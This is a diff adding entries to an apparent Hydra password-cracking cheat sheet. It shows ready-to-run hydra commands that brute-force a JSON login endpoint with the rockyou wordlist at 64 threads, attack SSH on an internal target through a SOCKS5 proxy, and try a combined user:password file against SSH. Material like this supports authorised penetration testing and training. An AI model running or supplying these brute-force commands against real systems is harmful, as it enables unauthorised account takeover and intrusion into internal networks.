@@ -28,6 +28,20 @@
 
 #### hydra -l USER -P rockyou.txt TARGET_IP -s TARGET_PORT http-post-form "/api/session/authenticate{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Authentication failed:H=Content-Type\: application/json" -t 64
 
+### Run Hydra using a proxy against an internal target with the commands:
+
+    export HYDRA_PROXY=socks5://localhost:1080
+
+    hydra -L users.txt -P passwords.txt TARGET_IP ssh -V
+
+## Alternate Trick: Combine your username and password list into a single "userpass" file
+
+### 1) Write the usernames and passwords in a single file divided by the symbol ':'
+
+### 2) Then run
+
+    hydra -C combined.txt TARGET_IP ssh -V
+
 # Hydra-Cheatsheet
 Hydra Password Cracking Cheetsheet
 
